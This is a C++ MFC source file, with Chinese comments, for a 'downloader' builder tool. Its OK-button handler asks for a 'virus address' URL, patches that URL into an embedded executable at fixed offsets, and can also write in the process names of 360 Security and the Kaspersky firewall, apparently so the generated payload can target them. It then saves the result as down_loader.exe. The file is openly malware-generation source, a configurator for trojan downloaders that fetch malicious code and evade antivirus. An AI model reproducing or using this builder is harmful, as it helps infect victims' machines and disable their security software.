// downloaderDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "downloader.h"
#include "downloaderDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// 对话框数据
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
END_MESSAGE_MAP()


// CdownloaderDlg 对话框




CdownloaderDlg::CdownloaderDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CdownloaderDlg::IDD, pParent)
	, m_url(_T(""))
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CdownloaderDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_EDIT1, m_url);
}

BEGIN_MESSAGE_MAP(CdownloaderDlg, CDialog)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	//}}AFX_MSG_MAP
	ON_BN_CLICKED(IDOK, &CdownloaderDlg::OnBnClickedOk)
END_MESSAGE_MAP()


// CdownloaderDlg 消息处理程序

BOOL CdownloaderDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CdownloaderDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CdownloaderDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标显示。
//
HCURSOR CdownloaderDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}


void CdownloaderDlg::OnBnClickedOk()
{
	// TODO: 在此添加控件通知处理程序代码
	UpdateData(true);
	CString sz1,sz2;
	sz1=(((CButton*)(GetDlgItem(IDC_CHECK1)))->GetCheck()&1)?"360tray.exe":"";//判断选项1是否被选
	sz2=(((CButton*)(GetDlgItem(IDC_CHECK2)))->GetCheck()&1)?"KAVPF.exe":"";//判断选项2是否被选
	char url[52];
	memset(url,0,52);
	if(m_url=="")
	{
		MessageBox(TEXT("请填写病毒地址"), TEXT("请填写病毒地址"),NULL);
		return;
	}

	sprintf(url,"%ls",m_url.GetBuffer(0));
	HRSRC hres;
	HGLOBAL hresdata;
	DWORD dwsize,dwwritten;
	LPBYTE p;
	HANDLE hfile;
	hres=FindResource(NULL,MAKEINTRESOURCE(IDR_EXE),_TEXT("EXE"));//查找资源
	if(hres==NULL)
		return;
	dwsize=SizeofResource(NULL,hres);//资源大小
	hresdata=LoadResource(NULL,hres);//加载资源
	if(hresdata==NULL)
		return;
	p=(LPBYTE)GlobalAlloc(GPTR,dwsize);
	if(p==NULL)
		return;
	CopyMemory((LPVOID)p,(LPCVOID)LockResource(hresdata),dwsize);
	CopyMemory((LPVOID)(p+0x2001c),(LPCVOID)url,52);//将用户输入的网站地址写入Downloader
	if(sz1!="")
	CopyMemory((LPVOID)(p+0x2007c),(LPCVOID)sz1,15);//如果用户选择了选项1，则将360安全卫士的进程名写入Downloader
	if(sz2!="")
	CopyMemory((LPVOID)(p+0x20068),(LPCVOID)sz2,14);//如果用户选择了选项2，则将卡巴防火墙的进程名写入Downloader
	WCHAR path[256];
	GetCurrentDirectoryW(256,path);
	wcscat(path,L"\\down_loader.exe");//在程序目录下生成Downloader，名为“down_loader.exe”
	DeleteFileW(path);
	hfile=CreateFileW(path,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);
	if(hfile==NULL)
		return;
	WriteFile(hfile,(LPVOID)p,dwsize,&dwwritten,NULL);
	CloseHandle(hfile);
	MessageBox(TEXT("文件生成成功"), TEXT("文件生成成功"), NULL);
}
